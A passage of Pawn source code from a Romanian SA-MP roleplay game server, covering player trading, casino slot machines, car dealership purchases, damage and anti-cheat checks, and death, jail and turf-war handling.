									return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai banii pe care i-ai pus in afacere!");
								
								if(CarTrade[playerid] != -1 && CarTrade[id] == -1 && GetVehicleSlots(id) == Iter_Count(MyVehicle<id>)) 
									return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai numarul maxim de vehicule! Puteti face doar schimb pe schimb.");
								
								if(CarTrade[id] != -1 && CarTrade[playerid] == -1 && GetVehicleSlots(playerid) == Iter_Count(MyVehicle<playerid>)) 
									return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player are numarul maxim de vehicule personale! Puteti face doar schimb pe schimb.");
								
								if(SkinTrade[playerid] != -1 && !free_skin(id)) 
									return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu are un skin slot liber.");
								
								if(SkinTrade[id] != -1 && !free_skin(playerid)) 
									return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai un skin slot liber.");

								if(CheckTradeMoney(playerid, id) != 0)
									return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti pune bani pe bani.");

								TradeReady[playerid] = 1;
								PlayerTextDrawSetString(playerid, TradePTD[playerid][4], "~g~pregatit");
								PlayerTextDrawSetString(id, TradePTD[id][4], "~g~pregatit");

								if(TradeReady[playerid] == 1 && TradeReady[id] == 1) {
									PlayerTextDrawSetString(playerid, TradePTD[playerid][6], "00:10");
									PlayerTextDrawSetString(id, TradePTD[id][6], "00:10");
									PlayerTextDrawShow(id, TradePTD[id][6]);
									PlayerTextDrawShow(playerid, TradePTD[playerid][6]);
									TradeTime[playerid] = 10;
								}
							}
							case 1: {
								PlayerTextDrawSetString(playerid, TradePTD[playerid][4], "~r~nepregatit");
								PlayerTextDrawSetString(id, TradePTD[id][4], "~r~nepregatit");
								PlayerTextDrawSetString(playerid, TradePTD[playerid][5], "~r~nepregatit");
								PlayerTextDrawSetString(id, TradePTD[id][5], "~r~nepregatit");
								TradeReady[playerid] = 0;
								TradeReady[id] = 0;
								if(TradeTime[id] != 0 || TradeTime[playerid] != 0) {
									PlayerTextDrawHide(id, TradePTD[id][6]);
									PlayerTextDrawHide(playerid, TradePTD[playerid][6]);
									TradeTime[playerid] = 0;
									TradeTime[id] = 0;
								}					
							}				
						}
					}
				}
				case 1: {
					if(TradeAccepted[playerid] == 1) {
						new id = TradeID[playerid];
						switch(TradeReady[playerid]) {
							case 0: {
			                    if(TradeItems[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "Eroare: Trebuie sa adaugi minim un bun personal!");
								
								if(GetPlayerCash(playerid) < MoneyTrade[playerid]) return SendClientMessage(playerid, COLOR_ERROR, "Eroare: {FFFFFF}Nu ai banii pe care i-ai pus in afacere!");
								
								if(CarTrade[playerid] != -1 && CarTrade[id] == -1 && GetVehicleSlots(id) == Iter_Count(MyVehicle<id>)) 
									return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai numarul maxim de vehicule! Puteti face doar schimb pe schimb.");
								
								if(CarTrade[id] != -1 && CarTrade[playerid] == -1 && GetVehicleSlots(playerid) == Iter_Count(MyVehicle<playerid>)) 
									return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player are numarul maxim de vehicule personale! Puteti face doar schimb pe schimb.");
								
								if(SkinTrade[playerid] != -1 && !free_skin(id)) 
									return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu are un skin slot liber.");
								
								if(SkinTrade[id] != -1 && !free_skin(playerid)) 
									return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai un skin slot liber.");

								if(CheckTradeMoney(playerid, id) != 0)
									return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti pune bani pe bani.");

								TradeReady[playerid] = 1;	
								PlayerTextDrawSetString(playerid, TradePTD[playerid][5], "~g~pregatit");
								PlayerTextDrawSetString(id, TradePTD[id][5], "~g~pregatit");
								if(TradeReady[playerid] == 1 && TradeReady[id] == 1) {
									PlayerTextDrawSetString(playerid, TradePTD[playerid][6], "00:10");
									PlayerTextDrawSetString(id, TradePTD[id][6], "00:10");
									PlayerTextDrawShow(playerid, TradePTD[playerid][6]);
									PlayerTextDrawShow(id, TradePTD[id][6]);
									TradeTime[playerid] = 10;	
								}
							}
							case 1: {
								PlayerTextDrawSetString(playerid, TradePTD[playerid][5], "~r~nepregatit");
								PlayerTextDrawSetString(id, TradePTD[id][5], "~r~nepregatit");
								PlayerTextDrawSetString(playerid, TradePTD[playerid][4], "~r~nepregatit");
								PlayerTextDrawSetString(id, TradePTD[id][4], "~r~nepregatit");
								TradeReady[playerid]=TradeReady[id]=0;
								if(TradeTime[id] != 0 || TradeTime[playerid] != 0) {
									PlayerTextDrawHide(id, TradePTD[id][6]);
									PlayerTextDrawHide(playerid, TradePTD[playerid][6]);
									TradeTime[playerid] = 0;
									TradeTime[id] = 0;
								}				
							}				
						}
					}
				}
				case 2: {
					if(TradeItems[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "Eroare: {FFFFFF}Nu ai adaugat nimic in aceasta afacere!");
					if(TradeReady[playerid] == 1) return SendClientMessage(playerid, COLOR_ERROR, "Eroare: {FFFFFF}Nu poti sterge bunurile adaugate in timp ce timer-ul este activat!");
					HideTradeItems(playerid);
					new id = TradeID[playerid];
					format(string, sizeof(string), "%s si-a sters bunurile adaugate.", GetName(playerid));
					SendClientMessage(playerid, COLOR_GOLD, string);
					SendClientMessage(id, COLOR_GOLD, string);		
				}	
				case 3: if(!TradeReady[playerid]) ShowPlayerDialog(playerid, DIALOG_TRADE, DIALOG_STYLE_LIST, "Trade", "Money (without billions)\nHouse\nBusiness\nVehicle\nCurrent Skin\nHidden Color\nJob\nRare Voucher (50PP)\nEpic Voucher (100PP)\nLegendary Voucher (500 PP)\nMoney (with billions)\nRainbow Ticket\nVip Ticket\nmythic Voucher (250PP)\nMillionaries Voucher (1000PP)\nClan\nMask\nLaser\nMaterials\nPremium Fuel Ticket\nCustom House Ticket", "Ok", "Cancel");	
			}
		}
		case 17: {
			if(p!=69 || raceVoted[playerid][0]!=-1) return true;
			new const race_map_name[][]={"SF TO LV", "Dam Rider", "Bandito County", "Dirtbike Danger", "Chopper Checkpoint", "WORLD WAR ACE"};
			sendRaceMessage(COLOR_CLIENT, "[VOTE] %s voted for map %s", GetName(playerid), race_map_name[select_race_map[playerid]]);
			race_map_votes[select_race_map[playerid]]++;
			updateRaceStatus(select_race_map[playerid]);
			raceVoted[playerid][0] = select_race_map[playerid];
		}
		case 21: {
			switch(p) {
				case 0: {
					if(!machine_Bet[playerid])
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai setat suma la bet!");

					if(PlayerInfo[playerid][pCasinoCredit] < machine_Bet[playerid])
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai suma de credite pe care ai setat-o la bet!");

					if(machine_in_progress[playerid]) 
						return SendClientMessage(playerid, COLOR_LGREEN, "Eraore: Nu poti da 'PLAY' de mai multe ori!");

					startMachine(playerid);
				}
				case 1: {
					if((toggleAuto[playerid]=!toggleAuto[playerid])) {
						PlayerTextDrawBoxColor(playerid, machine_TD[playerid][19], 0x009128FF);
						if(!machine_in_progress[playerid]) startMachine(playerid);
					}
					else PlayerTextDrawBoxColor(playerid, machine_TD[playerid][19], -2147450625);
					PlayerTextDrawShow(playerid, machine_TD[playerid][19]);
				}
				case 2: {
					if(machine_in_progress[playerid]) return true;
					td=1;
					while(++td<22) PlayerTextDrawHide(playerid, machine_TD[playerid][td]); --td;
					while(++td<36) PlayerTextDrawShow(playerid, machine_TD[playerid][td]);
					PlayerTextDrawShow(playerid, machine_TD[playerid][17]);
					player_selected[playerid] = 22;
					SelectTextDraw(playerid, 0xA9D549FF);
				}
				case 3: {
					if(machine_in_progress[playerid]) return SendClientMessage(playerid, COLOR_LGREEN, "Eraore: Nu poti schimba BET-ul acum!");
					format(gString, sizeof(gString), "Set the amount you want to bet. (min: 10 credits - max: %d credits)", PlayerInfo[playerid][pVip] != 3 ? 50 : 100);
					ShowPlayerDialog(playerid, DIALOG_BETMACHINE, DIALOG_STYLE_INPUT, "BET", gString, "Set", "Cancel");		
				}
			}
		}
		case 23: chooseCardMachine(playerid, p);
		case 24: {
			if(p==1) {
				if(!PlayerInfo[playerid][pAccessories][player_td_page[playerid]]) return SCMf(playerid, COLOR_CLIENT, "(Accessory) {FFFFFF}Nu detii accesoriul \"%s\".", Accessories[player_td_page[playerid]][e_AccessoryName]);

				if(!PlayerInfo[playerid][pAccessoriesOn][player_td_page[playerid]]) {
					SCMf(playerid, COLOR_CLIENT, "(Accessory) {FFFFFF}Accesoriul \"%s\" a fost activat.", Accessories[player_td_page[playerid]][e_AccessoryName]);

					PlayerTextDrawSetString(playerid, AccsPTD[2], "remove it");
					PlayerTextDrawBoxColor(playerid, AccsPTD[2], 0xcc3b31FF);
					PlayerTextDrawShow(playerid, AccsPTD[2]);
					PlayerInfo[playerid][pAccessoriesOn][player_td_page[playerid]] = 1;
					attach_player_accessory(playerid);
				}
				else {
					SCMf(playerid, COLOR_CLIENT, "(Accessory) {FFFFFF}Accesoriul \"%s\" a fost dezactivat.", Accessories[player_td_page[playerid]][e_AccessoryName]);

					PlayerTextDrawSetString(playerid, AccsPTD[2], "Put it");
					PlayerTextDrawBoxColor(playerid, AccsPTD[2], 0x3D8517FF);
					PlayerTextDrawShow(playerid, AccsPTD[2]);
					PlayerInfo[playerid][pAccessoriesOn][player_td_page[playerid]] = 0;
					deattach_player_accessory(playerid);
				}
			}
		}
	}
    return true;
}
redist::InsertDsCars(playerid, modelid) {
	new idd = Iter_Free(MyVehicle<>), i=-1,_rand = random(sizeof(DealerCarPos)), LastMoney[40]; 

	CarInfo[idd] = v_init(); CarInfo[idd][Userid] = PlayerInfo[playerid][pSQLID]; 
	CarInfo[idd][cID] = cache_insert_id(); CarInfo[idd][cModel] = modelid;
	CarInfo[idd][cValue] = DSModels[DealerID[playerid]][dPrice];
	while(i<=2) CarInfo[idd][cLocationx + cInfo:(++i)]=_:DealerCarPos[_rand][i];
	
	saveCar(idd); Iter_Add(MyVehicle<playerid>, idd);
	strmid(CarInfo[idd][cOwner], PlayerInfo[playerid][pUsername], 0, MAX_PLAYER_NAME);
	format(CarInfo[idd][cLicense], 100, "BHD %d", CarInfo[idd][cID]); format(CarInfo[idd][cLicenseColor], 100, "none");
	DestroyVehicleEx(DealerCar[playerid], ""); TogglePlayerControllable(playerid, 1);
	SetVehicleNumberPlate(idd, CarInfo[idd][cLicense]); SetCameraBehindPlayer(playerid);
	SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid, 0);
	strmid(LastMoney, formatBytes(money[playerid]),0,40); 
	GivePlayerCash(playerid, -DSModels[DealerID[playerid]][dPrice]);
	finishAchievement(playerid, 16); finishAchievement(playerid, 22);

	va_SendClientMessage(playerid, COLOR_MONEY, "Felicitari! Ai cumparat un %s pentru %s$.",aVehicleNames[modelid-400],FormatNumber(CarInfo[idd][cValue]));
	SendAdminMessage(COLOR_YELLOW, "%s si-a cumparat un %s[%d], (last money: $%s / new money: $%s)", 1, GetName(playerid), aVehicleNames[modelid-400], idd, LastMoney, formatBytes(money[playerid])); 
	InsertLog(playerid, "%s si-a cumparat un %s[%d], (last money: $%s / new money: $%s)", 1, GetName(playerid), aVehicleNames[modelid-400], idd, LastMoney, formatBytes(money[playerid]));	

    if(MyVehicleSpawn[playerid] != (!PlayerInfo[playerid][pReborn]?4:6)) SpawnPlayerCar(playerid, idd);
	SetPlayerCheckpoint(playerid, CarInfo[idd][cLocationx], CarInfo[idd][cLocationy], CarInfo[idd][cLocationz], 4.0); CP[playerid] = 53; DealerID[playerid] = -1;
	_query("UPDATE cars SET License='%s' WHERE ID=%d", CarInfo[idd][cLicense], CarInfo[idd][cID]);
	return true;
}
public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ) {
	if PlayerInfo[playerid][pMember] && PlayerInfo[playerid][pRank] > 5 && InWarTurf[PlayerInfo[playerid][pMember]] != -1 *then {
		foreach(new i : faction_players<PlayerInfo[playerid][pMember]>) {
			SendClientMessage(i,COLOR_YELLOW, "* Un lider/co-lider a setat un punct pe mapa. Du-te la el!");
			SetPlayerCheckpoint(i, fX, fY, fZ, 5.0);
			CP[i] = 43;
		}
	}
	if(PlayerInfo[playerid][pAdmin] > 0) {
		if(JobWorking[playerid] == 1 && PlayerInfo[playerid][pAdmin] != 7) return SendClientMessage(playerid, COLOR_WARNING, "Nu ai voie sa faci abuz de functie!");
        if(GetPlayerState(playerid) == 2) SetVehiclePosEx(GetPlayerVehicleID(playerid), fX, fY, fZ+5);
		else SetPlayerPosFindZ(playerid, fX, fY, fZ+5);
	}
    return true;
}

public OnPlayerTakeDamage(playerid, issuerid, Float:amount, weaponid, bodypart) {
	if(UsedFly[playerid]) return true;
	if playerDeath[playerid] != -1 *then return true;
	
	new Float:fHealth, Float:fArmour;
 	GetPlayerHealthEx(playerid,fHealth);
 	GetPlayerArmourEx(playerid,fArmour);

 	if(issuerid != 65535) {
 		if(PlayerInfo[playerid][pMember] == PlayerInfo[issuerid][pMember] && InWarTurf[PlayerInfo[issuerid][pMember]] != -1) {
			SetPlayerHealthEx(playerid, fHealth);
			return true;				
		}
	 	if(fArmour < 1) {
	 		if((fHealth=fHealth-amount) < 1) fHealth = 0;
	 		SetPlayerHealthEx(playerid, fHealth);
	 		SetPlayerArmourEx(playerid, 0);
	 		if(fHealth<1) OnPlayerDeath(playerid, issuerid, weaponid), playerDeath[playerid] = issuerid;
	 		return true;
	 	} 
 	}
 	if((fArmour=fArmour-amount) < 1) fArmour = 0;
 	SetPlayerHealthEx(playerid, 100);
 	SetPlayerArmourEx(playerid, fArmour);	
	return true;
}
public OnPlayerGiveDamage(playerid, damagedid, Float:amount, weaponid, bodypart) {
	new string[110];
	if(amount >= 82.50 && weaponid != 34 && weaponid != 4) {
		SendClientMessage(playerid, COLOR_WHITE, "Stop cheating (Global kill #2).");
		KickEx(playerid);
		return true;
	}
	if(!IsPlayerConnected(damagedid))
		return true;

	if(togding[playerid] == 0) PlayerPlaySound(playerid,17802,0.0,0.0,0.0);
 	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) return true;
	if(GetPlayerSurfingVehicleID(playerid) != INVALID_VEHICLE_ID) return true;
	if(playerDeath[damagedid] == -1) {
		foreach(new i : MySpec<playerid>) {
			new victim[MAX_PLAYER_NAME], attacker[MAX_PLAYER_NAME];
			new weaponname[24];
			GetPlayerName(playerid, attacker, sizeof (attacker));
			GetPlayerName(damagedid, victim, sizeof (victim));
		 
			GetWeaponName(weaponid, weaponname, sizeof (weaponname));
			if(weaponid == 0) weaponname = "Fist";
			format(string, sizeof(string), "[DMG] %s did %.0f damage to %s using weapon %s.", attacker, amount, victim, weaponname);
			SendClientMessage(i, 0xFFADADFF, string);				
		}	
	}
	if(amount < 0) {
		SendClientMessage(playerid, COLOR_WHITE, "Stop cheating (Global kill #1).");
		KickEx(playerid);
		return true;
	}
	if(tazer[playerid] == 1 && IsACop(playerid) && weaponid == 24) {
		if(IsACop(damagedid)) return SendClientMessage(playerid, COLOR_WHITE, "Acel player este intr-un departament de politie..");
		if(PlayerCuffed[damagedid] == 1) return SendClientMessage(playerid, COLOR_WHITE, "Acel player este deja electrocutat.");
		if(PlayerInfo[damagedid][pSleeping]) return SendClientMessage(playerid, COLOR_WHITE, "Acel player doarme.");
		if(GetDistanceBetweenPlayers(playerid, damagedid) < 15) {
			format(string, sizeof(string), "* %s tazed %s for 8 seconds.", GetName(playerid), GetNameEx(damagedid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE);
			TogglePlayerControllable(damagedid, 0);
			PlayerCuffed[damagedid] = 1;
			PlayerCuffedTime[damagedid] = 8;
			return true;
		}
	}				
	if(weaponid == 34) {
        SetPlayerHealthEx(damagedid, 0.0);
        SetPlayerArmourEx(damagedid, 0.0);
        OnPlayerDeath(damagedid,playerid,weaponid);
		playerDeath[damagedid] = playerid;
		return true;
    }
 	new Float: HP, Float: AP ;
	GetPlayerHealthEx(damagedid,HP);
	GetPlayerArmourEx(damagedid,AP);
	if(IsSafeZone[playerid]!=-1) {
		SendClientMessage(playerid, COLOR_LIGHTRED, "Ai primit freeze timp de 5 secunde deoarece ai lovit pe cineva intr-o zona protejata.");
		TogglePlayerControllable(playerid, 0);
		SetPlayerFreeze(playerid, 5);
		SetPlayerArmedWeapon(playerid, 0);
		SetPlayerHealth(playerid, HP);
	}
	if IsPlayerInRangeOfPoint(playerid, 150.0, 2229.7744,1606.8580,1006.1860) *then {
		SendClientMessage(playerid, COLOR_RED, "Nu poti face DM in casino!");
		TogglePlayerControllable(playerid, 0);
		SetPlayerFreeze(playerid, 5);
		SetPlayerArmedWeapon(playerid, 0);	
		SetPlayerHealth(playerid, HP);
	}
	if(PlayerCuffed[damagedid] == 1) SetPlayerHealthEx(damagedid,99);
	if(PlayerInfo[damagedid][pSleeping]) SetPlayerHealthEx(damagedid, 99);

	if(DMGTimer[damagedid]>gettime()) Combo[playerid] ++; 
	else Combo[playerid] = 0;
	new weapon[180];
	if(GetPlayerWeapon(playerid) == 0) weapon ="Fist";
	else GetWeaponName(weaponid, weapon, sizeof (weapon));			
	if(PlayerInfo[damagedid][pShowDMG] == 1 && GetPVarInt(playerid, "Undercover") == 0) {
		if(Combo[playerid] != 0) format(string, sizeof(string), "%s~n~-%0.1f HP with %s (%dx)", GetName(playerid), amount, weapon, Combo[playerid]+1);
		else format(string, sizeof(string), "%s~n~-%0.1f HP with %s", GetName(playerid), amount, weapon);			
		PlayerTextDrawSetString(damagedid, DMGTD[0], string);
		PlayerTextDrawShow(damagedid, DMGTD[0]);				
	}
	DMGTimer[damagedid]=gettime()+2;
	if(PlayerInfo[playerid][pShowDMG] == 1) {	
		if(Combo[playerid] != 0) format(string, sizeof(string), "%s~n~+%0.1f HP with %s (%dx)", GetName(damagedid), amount, weapon, Combo[playerid]+1);
		else format(string, sizeof(string), "%s~n~+%0.1f HP with %s", GetName(damagedid), amount, weapon);			
		PlayerTextDrawSetString(playerid, DMGTD[1], string);
		PlayerTextDrawShow(playerid, DMGTD[1]);
		DMGTimer[playerid]=gettime()+2;
	}			
	return true;
}

public OnPlayerDeath(playerid, killerid, reason) {	
	if(is_player_death[playerid]) return true;
	is_player_death[playerid] = true;
	playerDeath[playerid] = !IsPlayerConnected(killerid) ? INVALID_PLAYER_ID : playerDeath[playerid];

	if killerid != playerDeath[playerid] && playerDeath[playerid] != INVALID_PLAYER_ID && !PlayerInfo[playerid][pAdmin] *then {
		format(gString, 128, "Warning: %s posible fake kill.", GetName(killerid));
		SendAdminMessage(COLOR_RED, gString, 1);
	}

 	destroy_rent_car(playerid);
	Update3DTextLabelText(deathLabel[playerid], COLOR_LIGHTRED, "[dead]");
	Attach3DTextLabelToPlayer(deathLabel[playerid], playerid, 0.0, 0.0, 0.3);
	new string[110];

	SetPlayerWorldBounds(playerid, 20000.0000, -20000.0000, 20000.0000, -20000.0000);
	
	
	if(PlayerInfo[playerid][pWantedLevel] != 0) {
		new count, names[180];	
		foreach(new i : StreamedPlayer[playerid]) {
			if(IsACop(i) && CrimInRange(75.0, playerid,i) && OnDuty[i]) {
				count = 1;
				GameTextForPlayer(i, "running suspect bonus!", 3000, 1);
				GivePlayerCash(i, PlayerInfo[playerid][pWantedLevel] * 2000);
				AddFactionRaport(i, 0);			

				format(string, sizeof(string), "Ai primit $%d bonus pentru prinderea suspectului %s.", PlayerInfo[playerid][pWantedLevel] * 2000, GetName(playerid));
				SendClientMessage(i, COLOR_DBLUE, string);
				format(names, 256, "%s %s", names, GetName(i));
			}	
			if(count == 1) {
				if(ProxDetectorS(30.0, i, playerid)) {
					format(string, sizeof(string), "* %s is now in jail thanks to: %s", GetName(playerid), names);
					SendClientMessage(i, COLOR_PURPLE, string);
				}
			}				
		}	
		if(count == 1) {	
			if(!IsPlayerConnected(killerid)) format(gString, 128, "Dispatch: %s has been killed by No One and will be in jail for %d seconds, over.", GetName(playerid), (PlayerInfo[playerid][pWantedLevel])*(150));
			else format(gString, 128, "Dispatch: %s has been killed by %s and will be in jail for %d seconds, over.", GetName(playerid), GetName(killerid), (PlayerInfo[playerid][pWantedLevel])*(150));
			SendTeamMessage(1, 0x2e64feFF, gString);
			GivePlayerCash(playerid, -PlayerInfo[playerid][pWantedLevel] * 2000);
			PlayerInfo[playerid][pWantedDeaths] += 1;
			PlayerInfo[playerid][pJailed] = 1;
			PlayerInfo[playerid][pJailTime] = (PlayerInfo[playerid][pWantedLevel])*(250);
			PlayCopSound();
			format(string, sizeof(string), "Because you got killed, you lost $%d and you will be taken to jail. You are no longer a criminal.", PlayerInfo[playerid][pJailTime], PlayerInfo[playerid][pWantedLevel] * 2000);
			SendClientMessage(playerid, COLOR_LIGHTRED, string);
			SendClientMessage(playerid, COLOR_GOLD, "Ai la dispozitie comanda (/jailmenu) pentru a iesi in curtea inchisorii.");
			stop_rob(playerid, 0);
			TogglePlayerControllable(playerid, 0);
			SetPlayerFreeze(playerid, 1);
			PlayerInfo[playerid][pWantedLevel] = 0;
			PlayerTextDrawHide(playerid, WantedTD);
			SetPlayerWantedLevel(playerid, 0);
			ClearCrime(playerid);					
		}
	}				

	if(killerid != INVALID_PLAYER_ID) {	
	
		if(IsACop(playerid)) finishAchievement(killerid, 5);
		if(PaintType[killerid] != 0 && PaintType[playerid] != 0) {
			if(PaintText[PaintType[playerid]-1] > 1) return true;
			if(PaintTime[PaintType[playerid]-1] < 1) return true;		
			CheckMission(killerid, 0);
			PKills[killerid] ++;
			PDeaths[playerid] ++;
			lastKill[killerid] ++;
			getKillPaintType(killerid);
			lastKill[playerid] = 0;
			SCMf(killerid, COLOR_CLIENT, "You have killed %s. You now have %d kills. (+50 mats)", GetName(playerid), PKills[killerid]);
			PlayerInfo[killerid][pMats] += 50;
			UpdateVar(killerid, "Materials", PlayerInfo[killerid][pMats]);
			foreach(new i : InPaint<PaintType[playerid]-1>) SendDeathMessageToPlayer(i, killerid, playerid, reason);
		    if(PKills[killerid] > PaintballWinnerScore[PaintType[playerid]-1]) {
		    	if(PaintballWinner[PaintType[playerid]-1]!=killerid) {
		        	SendPaintMessage(PaintType[playerid], COLOR_YELLOW, "%s is in the lead with %d kills.", GetName(killerid), PKills[killerid]);
		        }
		        PaintballWinner[PaintType[playerid]-1] = killerid;
	        	PaintballWinnerScore[PaintType[playerid]-1] = PKills[killerid];
	    	}
		}

		if(PlayerInfo[killerid][pJailTime] != 0 && PlayerInfo[playerid][pJailTime] != 0) {
			PlayerInfo[killerid][pJailTime] += 120;
			SendClientMessage(killerid, COLOR_WARNING, "Sentinta ta a fost marita cu 2 minute deoarece ai ucis un player.");
		}
		
		if(CP[playerid] == 50) {
			CP[playerid] = 0;
			RemovePlayerAttachedObject(playerid,0);
			DisablePlayerCheckpointEx(playerid);
			RemovePlayerAttachedObject(playerid,1);
		}
		if(PlayerCuffed2[playerid] == 1) {
		    PlayerCuffed2[playerid] = 0;
	    	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_NONE);
	    	RemovePlayerAttachedObject(playerid,1);
		}
		if(IsAMember(playerid) && IsAMember(killerid)) {
			new turf = IsPlayerOnTurf[playerid];
			if(turf == IsPlayerOnTurf[killerid] && InWarTurf[PlayerInfo[playerid][pMember]] == InWarTurf[PlayerInfo[killerid][pMember]] && InWarTurf[PlayerInfo[playerid][pMember]]!=-1) { 
				foreach(new i : faction_players<PlayerInfo[playerid][pMember]>) 
					SendDeathMessageToPlayer(i, killerid, playerid, reason);
				
				foreach(new i : faction_players<PlayerInfo[killerid][pMember]>) 
					SendDeathMessageToPlayer(i, killerid, playerid, reason);
				
				if(PlayerInfo[killerid][pMember] == WarInfo[turf][wAttacker] || PlayerInfo[killerid][pMember] == WarInfo[turf][wFaction]) 
					WarScoreF[PlayerInfo[killerid][pMember]][turf] += 1.0;

             	if(++WarKills[killerid] > bestscoreat[turf]) 
             		bestscoreat[turf] = WarKills[killerid], bestmemberat[turf]=killerid;
             	
             	if(++WarDeaths[playerid] > worstscoreat[turf]) 
					worstscoreat[turf] = WarDeaths[playerid], worstmemberat[turf]=playerid;

				SCMf(killerid, COLOR_CLIENT, "You have killed %s (%d). (+500 mats)",GetName(playerid), playerid);
				SCMf(playerid, COLOR_CLIENT, "You have been killed by %s (%d).",GetName(killerid), killerid);	
				PlayerInfo[killerid][pMats]+=500;
				new Float: Pos[3], sweapon, sammo, idd, i=-1;
				GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
				while((++i)<12) {
					GetPlayerWeaponData(playerid, i, sweapon, sammo); 
					if(sweapon != 0) {
						idd = CreateDynamicPickup(WeaponObject(sweapon), 23, Pos[0]+random(4), Pos[1]+random(4), Pos[2], GetPlayerVirtualWorld(playerid));
						Pickups[idd][psWar] = turf;
						Pickups[idd][psType] = 2;
						Pickups[idd][psWeapon] = sweapon;
						Pickups[idd][psAmmo] = sammo;
					}
				}
				idd = CreateDynamicPickup(1240, 23, Pos[0]+random(4), Pos[1]+random(4), Pos[2], GetPlayerVirtualWorld(playerid));
				Pickups[idd][psType] = 1;
				Pickups[idd][psWar] = turf;
				Pickups[idd][psWeapon] = 0;
				return true;
			}
		}	
		if(Mobile[playerid] != -1) {
			if(Mobile[playerid] != -1) {
				SendClientMessage(Mobile[playerid],  COLOR_GRAD2, "Linia tocmai a fost intrerupta...");
				CellTime[Mobile[playerid]] = 0;
				CellTime[playerid] = 0;
				PlayerInfo[playerid][pChatCMD] = 0;
				PlayerInfo[Mobile[playerid]][pChatCMD] = 0;
				PlayerTextDrawHide(playerid, ChatCMD);
				PlayerTextDrawHide(Mobile[playerid], ChatCMD);
				Mobile[Mobile[playerid]] = -1;
			}
			Mobile[playerid] = -1;
			CellTime[playerid] = 0;
		}
		if(PlayerInfo[playerid][pClan] != 0 && PlayerInfo[killerid][pClan] != 0 && PlayerAreaType[playerid]==AREA_CLANZONE) return true;
		if(PlayerHit[killerid] == playerid) {
			PlayerPlaySound(killerid,17802,0.0,0.0,0.0);
			
			new wname[30];
			GetWeaponName(reason, wname, sizeof(wname));
			if(reason == 0) wname = "Pumn";
			
			GivePlayerCash(killerid, HeadValue[playerid]);
			PlayerHit[killerid] = -1;
			
			if(DistanceToPlayer(killerid, playerid) >= 100 || reason == 4) {
				if(DistanceToPlayer(killerid, playerid) >= 200) GivePlayerCash(killerid, HeadValue[playerid]);
				va_SendClientMessage(killerid, COLOR_MONEY, "* Ai efectuat cu succes contractul pe %s(%d). Ai primit: $%s.", GetName(playerid), playerid, FormatNumber(HeadValue[playerid]));
				format(string, sizeof(string), "(!) %s[rank: %d] a terminat contractul pe %s [distanta: %.1fm][arma: %s][fail]", GetName(killerid), PlayerInfo[killerid][pRank], GetName(playerid), DistanceToPlayer(killerid, playerid), wname);
				if(PhoneOnline[killerid] == 0) FailRaport(killerid, 0);
				if(GetPVarInt(killerid, "Undercover") == 0) FailRaport(killerid, 1);
				if(PhoneOnline[killerid] == 1 && GetPVarInt(killerid, "Undercover") == 1) {
					CheckMission(playerid, 9);
					AddFactionRaport(killerid, 0);
					format(string, sizeof(string), "(!) %s[rank: %d] a terminat contractul pe %s [distanta: %.1fm][arma: %s][succes]", GetName(killerid), PlayerInfo[killerid][pRank], GetName(playerid), DistanceToPlayer(killerid, playerid), wname);				
				}	
			}	
			else {
				FailRaport(killerid, 3);
				format(string, sizeof(string), "(!) %s[rank: %d] a terminat contractul pe %s [distanta: %.1fm][arma: %s][fail]", GetName(killerid), PlayerInfo[killerid][pRank], GetName(playerid), DistanceToPlayer(killerid, playerid), wname); 
			}	
			SendFactionMessage(11, COLOR_LIGHTBLUE, string);				
			HeadValue[playerid] = 0;
			Iter_Remove(servicePlayers<7>, playerid);
			return true;
		}		
		if(IsAMember(playerid) && InWarTurf[PlayerInfo[playerid][pMember]] != -1) return true;		
		if(PaintType[killerid] == 0 && PaintType[killerid] == 0 && PlayerInfo[killerid][pJailed] == 0 && !IsACop(killerid) && !IsACop(playerid)) {
			if((PlayerInfo[killerid][pMember] == 0 && PlayerInfo[playerid][pMember] == 0 || PlayerInfo[playerid][pMember] != PlayerInfo[killerid][pMember]) && PlayerAreaType[playerid] != AREA_CLANZONE) {
				posible_wanted[playerid] = killerid;
				SendClientMessage(playerid,COLOR_WARNING,"Ai fost omorat de un player. Ai la dispozitie un minut pentru a folosi comanda '/call 112'.");
				SetTimerEx("ClearWanted",60000, false,"d", playerid);
			}
		}
		killerid = INVALID_PLAYER_ID;
	}
	return true;
}

public OnVehicleMod(playerid, vehicleid, componentid) {
	switch(componentid) { case 1008..1010: if(IsValidVehicleModelNos(GetVehicleModel(vehicleid))) RemoveVehicleComponent(vehicleid, componentid); }
	if(FindSpawnID(vehicleid) != -1) SaveTunning(FindSpawnID(vehicleid), GetVehicleComponentType(componentid), AddVehicleComponent(FindSpawnID(vehicleid), componentid));
	if(!IsComponentidCompatible(GetVehicleModel(vehicleid), componentid)) RemoveVehicleComponent(vehicleid, componentid); 
	return SetVehicleHealth(vehicleid, 999);
}

stock FailRaport(playerid, id) {
	switch(id) {
		case 0: SendClientMessage(playerid, COLOR_YELLOW, "Ai primit un punct de raport invalid deoarece nu ai telefonul inchis.");
		case 1: SendClientMessage(playerid, COLOR_YELLOW, "Ai primit un punct de raport invalid deoarece nu esti undercover.");
		case 2: SendClientMessage(playerid, COLOR_YELLOW, "Ai primit un punct de raport invalid deoarece distanta dintre tine si tinta este mai mica de 100m.");
	}
	return 1;
}

RandomEx(minim, max) return random(max-minim)+minim;

cmd:addpin(playerid, params[]) {
	if(player_selected[playerid]) return true;
